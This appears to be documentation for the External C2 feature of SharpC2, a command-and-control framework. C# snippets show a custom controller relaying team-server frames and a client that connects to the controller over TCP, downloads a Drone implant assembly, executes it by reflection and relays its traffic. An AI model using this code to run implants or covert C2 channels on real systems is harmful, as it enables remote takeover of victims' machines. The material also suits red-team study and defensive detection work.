External C2
===========

External C2 allow a 3rd application to act as a communication layer between the SharpC2 team server and Drone payload.  This allows users to implement completely custom C2 protocols without having to modify the core framework.

.. graphviz::

   digraph foo {
    rankdir="LR";
    node [shape=box];

    teamserver [label="Team Server"];
    controller [label="Controller"];
    client [label="Client"];
    drone [label="Drone"];

    teamserver -> controller [label="C2 Frames"];
    controller -> client [label="Custom C2"];
    client -> drone [label="C2 Frames"];

    controller -> teamserver;
    client -> controller;
    drone -> client
   }


|

ExternalC2.Net
--------------

The SharpC2 solution contains a .NET library to help simplify the process of implementing ExternalC2.  Example Controller and Client projects are also provided.


3rd Party Controller
--------------------

The controller can leverage the ``ExternalC2.Net.Server`` namespace.  It must instantiate a new ``ServerController`` class with the IP address and port of the ExternalC2 handler.  Multiple instances can be used to handle more than one incoming connection, which can be run in separate threads.


.. code-block:: c#

    var controller = new ServerController(target, port);
    _ = Task.Run(async () => await HandleClient(controller, client));


The ``ServerController`` provides an event that is fired when a downstream frame is received from the team server.  In most cases, you would just want to forward this straight to your client.  Run the ``Start`` method to instruct the ``ServerController`` to begin reading from the team server.

.. code-block:: c#

    controller.OnDataFromTeamServer += async delegate(byte[] data)
    {
        // send data received from the team server to the client
        await client.WriteData(data);
    };

    // run the controller
    _ = controller.Start();

Upon connecting to the team server, it will instantly provide a Drone payload in the form of a .NET assembly.  Whenever you have upstream data to give to the team server, use the ``SendData`` method.

.. code-block:: c#

    // read from the client
    while (client.Connected)
    {
        if (client.DataAvailable())
        {
            // this is upstream from the drone
            var upstream = await client.ReadData();
                
            // give it to the team server
            await controller.SendData(upstream);
        }

        await Task.Delay(100);
    }

3rd Party Client
----------------

The client can leverage the ``ExternalC2.Net.Client`` namespace.  It should initiate communication with your 3rd controller and immediately begin reading from it to receive the Drone payload.

.. code-block:: c#

    // connect to controller
    var controller = new TcpClient();
    await controller.ConnectAsync(target, port);
        
    // read payload
    var payload = await controller.ReadData();


Once the payload has been read, instantiate a new instance of ``DroneController``.  This also provides an event that is fired when an upstream frame is sent from the Drone.  This should just be sent up to your controller.

.. code-block:: c#

    // create drone controller
    var drone = new DroneController();

    // event is fired whenever the drone sends upstream data
    drone.OnDataFromDrone += async delegate(byte[] bytes)
    {
        // send to controller
        await controller.WriteData(bytes);
    };

The Drone payload can then be executed by calling the ``ExecutePayload`` method.  This will load the Drone and attempt to connect to inbound and outbound queues.  This is done entirely using reflection (no named pipes or TCP connections, etc).

The client can then listen for downstream data from the controller and pass it to the Drone using the ``SendDrone`` method.

.. code-block:: c#

    while (controller.Connected)
    {
        if (controller.DataAvailable())
        {
            // read from controller
            var downstream = await controller.ReadData();
                
            // send it to the drone
            drone.SendDrone(downstream);
        }

        await Task.Delay(100);
    }